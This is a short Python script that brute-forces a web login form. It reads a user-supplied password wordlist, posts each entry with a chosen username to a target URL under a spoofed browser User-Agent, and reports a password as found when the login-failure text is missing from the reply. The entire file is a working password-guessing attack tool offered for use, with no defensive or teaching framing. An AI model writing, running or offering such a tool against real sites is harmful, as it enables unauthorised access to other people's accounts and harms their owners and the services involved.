import time
import os
import requests

def Brute():
	os.system('cls' if os.name == 'nt' else 'clear')

	wordlist = input("Your wordlist.txt: ")
	url = input("Your url: ")
	paramv1 = input("Username: ")
	param1 = input("First paramater: ")
	param2 = input("Second parameter: ")
	word1 = input("Word: ")
	header = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"}
	i = 0

	try:
		txt = open(wordlist, "r")
	except FileNotFoundError:
		print("Your wordlist was not found.")
		time.sleep(2)
		Brute()
	txt = open(wordlist, "r")
	for word in txt:
		words = word.rstrip()
		payload = {param1:paramv1, param2:words}
		r = requests.post(url, data=payload, headers=header)
		if word1 not in r.text:
			i += 1
			print("{} - Password for {} : {}".format(i, paramv1, words))
			break
		else:
			i += 1
			print("{} - Testing..".format(i))
			time.sleep(0.001)
Brute()